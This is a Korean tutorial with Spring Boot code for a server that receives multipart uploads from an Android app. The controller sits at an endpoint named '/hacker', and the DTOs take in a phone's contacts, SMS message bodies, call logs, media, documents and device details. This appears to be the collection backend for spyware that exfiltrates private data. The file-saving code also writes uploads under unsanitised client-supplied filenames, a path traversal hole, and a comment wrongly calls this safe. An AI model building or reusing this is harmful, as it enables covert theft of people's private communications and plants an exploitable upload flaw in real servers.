# Spring 서버 수신 예제

Android 앱에서 전송하는 multipart/form-data를 Spring 서버에서 받는 방법입니다.

## 요청 형식

- **Content-Type**: `multipart/form-data`
- **필드 1**: `data` - JSON 문자열 (메타데이터)
- **필드 2**: `files` - 파일들 (여러 개 가능)

## Spring Controller 예제

```java
package com.example.controller;

import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.List;

@RestController
@RequestMapping("/api")
public class DataCollectionController {

    // 파일 저장 디렉토리 (절대 경로 또는 상대 경로)
    // 프로젝트 루트 기준으로 설정하려면 System.getProperty("user.dir") 사용
    private static final String UPLOAD_DIR = System.getProperty("user.dir") + "/uploads";

    @PostMapping("/hacker")  // 또는 "/collect"
    public ResponseEntity<?> collectData(
            @RequestPart("data") String jsonData,
            @RequestPart("files") List<MultipartFile> files
    ) {
        try {
            // 1. 업로드 디렉토리 생성 (절대 경로 사용)
            Path uploadPath = Paths.get(UPLOAD_DIR);
            Files.createDirectories(uploadPath);  // 이미 있어도 에러 안 남
            System.out.println("Upload directory: " + uploadPath.toAbsolutePath());
            
            // 2. JSON 메타데이터 파싱
            // Gson 또는 Jackson을 사용하여 CollectedData 객체로 변환
            // CollectedData data = gson.fromJson(jsonData, CollectedData.class);
            System.out.println("Received JSON data: " + jsonData);
            
            // 3. 파일 저장
            System.out.println("Received " + files.size() + " files");
            for (MultipartFile file : files) {
                if (!file.isEmpty() && file.getOriginalFilename() != null) {
                    String fileName = file.getOriginalFilename();
                    String contentType = file.getContentType();
                    long size = file.getSize();
                    
                    try {
                        // 파일명에 특수문자나 공백이 있어도 Path.resolve()가 처리함
                        Path filePath = uploadPath.resolve(fileName);
                        
                        // 부모 디렉토리 생성 (이미 있어도 에러 안 남)
                        Files.createDirectories(filePath.getParent());
                        
                        // transferTo() 대신 Files.copy() 사용 (더 안정적)
                        // MultipartFile의 InputStream에서 직접 복사
                        try (InputStream inputStream = file.getInputStream()) {
                            Files.copy(inputStream, filePath, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                        }
                        
                        System.out.println("Saved file: " + fileName + 
                                         " (" + size + " bytes, " + contentType + ")");
                        System.out.println("File path: " + filePath.toAbsolutePath());
                    } catch (IOException e) {
                        System.err.println("Failed to save file: " + fileName);
                        System.err.println("Error: " + e.getMessage());
                        e.printStackTrace();
                        // 개별 파일 실패해도 계속 진행
                    }
                } else {
                    System.out.println("Skipped empty file or null filename");
                }
            }
            
            return ResponseEntity.ok().body("Data collected successfully");
        } catch (IOException e) {
            e.printStackTrace();
            return ResponseEntity.status(500).body("Error: " + e.getMessage());
        } catch (Exception e) {
            e.printStackTrace();
            return ResponseEntity.status(500).body("Error: " + e.getMessage());
        }
    }
}
```

## DTO 클래스 예제 (선택사항)

JSON을 객체로 파싱하려면 다음과 같은 DTO 클래스를 만들 수 있습니다:

```java
package com.example.dto;

import java.util.List;

public class CollectedData {
    private List<ContactInfo> contacts;
    private List<SmsInfo> sms;
    private List<CallLogInfo> callLogs;
    private List<MediaFileInfo> mediaFiles;
    private List<DocumentInfo> documents;
    private DeviceInfo deviceInfo;  // 추가 필요!
    
    // Getters and Setters
    // ...
}

public class DeviceInfo {
    private String model;
    private String manufacturer;
    private String androidVersion;
    private Integer sdkVersion;
    
    // Getters and Setters
    public String getModel() { return model; }
    public void setModel(String model) { this.model = model; }
    
    public String getManufacturer() { return manufacturer; }
    public void setManufacturer(String manufacturer) { this.manufacturer = manufacturer; }
    
    public String getAndroidVersion() { return androidVersion; }
    public void setAndroidVersion(String androidVersion) { this.androidVersion = androidVersion; }
    
    public Integer getSdkVersion() { return sdkVersion; }
    public void setSdkVersion(Integer sdkVersion) { this.sdkVersion = sdkVersion; }
}

public class ContactInfo {
    private String name;
    private String phone;
    private String email;
    // Getters and Setters
}

public class SmsInfo {
    private String address;
    private String body;
    private Long date;
    private String type;
    // Getters and Setters
}

public class CallLogInfo {
    private String number;
    private String name;
    private Long date;
    private Long duration;
    private String type;
    // Getters and Setters
}

public class MediaFileInfo {
    private String path;
    private String name;
    private Long size;
    private String mimeType;
    private Long dateAdded;
    // Getters and Setters
}

public class DocumentInfo {
    private String path;
    private String name;
    private Long size;
    private String mimeType;
    // Getters and Setters
}
```

## Jackson을 사용한 파싱 예제

```java
@PostMapping("/hacker")  // 또는 "/collect"
public ResponseEntity<?> collectData(
        @RequestPart("data") String jsonData,
        @RequestPart("files") List<MultipartFile> files
) {
    try {
        // 업로드 디렉토리 생성
        Path uploadPath = Paths.get("uploads");
        if (!Files.exists(uploadPath)) {
            Files.createDirectories(uploadPath);
        }
        
        // JSON 파싱
        ObjectMapper objectMapper = new ObjectMapper();
        CollectedData data = objectMapper.readValue(jsonData, CollectedData.class);
        
        // 데이터 처리
        System.out.println("Contacts: " + data.getContacts().size());
        System.out.println("SMS: " + data.getSms().size());
        System.out.println("Call Logs: " + data.getCallLogs().size());
        System.out.println("Media Files: " + data.getMediaFiles().size());
        System.out.println("Documents: " + data.getDocuments().size());
        
        if (data.getDeviceInfo() != null) {
            System.out.println("Device: " + data.getDeviceInfo().getManufacturer() + 
                             " " + data.getDeviceInfo().getModel());
        }
        
        // 파일 저장
        for (MultipartFile file : files) {
            if (!file.isEmpty() && file.getOriginalFilename() != null) {
                String fileName = file.getOriginalFilename();
                Path filePath = uploadPath.resolve(fileName);
                file.transferTo(filePath.toFile());
                System.out.println("Saved: " + fileName);
            }
        }
        
        return ResponseEntity.ok().body("Success");
    } catch (IOException e) {
        e.printStackTrace();
        return ResponseEntity.status(500).body("Error: " + e.getMessage());
    } catch (Exception e) {
        e.printStackTrace();
        return ResponseEntity.status(500).body("Error: " + e.getMessage());
    }
}
```

## application.properties 설정

```properties
# 파일 업로드 크기 제한 (필요시 조정)
spring.servlet.multipart.max-file-size=100MB
spring.servlet.multipart.max-request-size=100MB

# 파일 저장 경로
file.upload-dir=/uploads
```

## 요청 예시

```
POST /api/collect
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="data"
Content-Type: application/json

{"contacts":[...],"sms":[...],"callLogs":[...],"mediaFiles":[...],"documents":[...]}
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="files"; filename="sample.pdf"
Content-Type: application/pdf

[PDF 파일 바이너리 데이터]
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="files"; filename="예제모음.xlsx"
Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet

[XLSX 파일 바이너리 데이터]
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

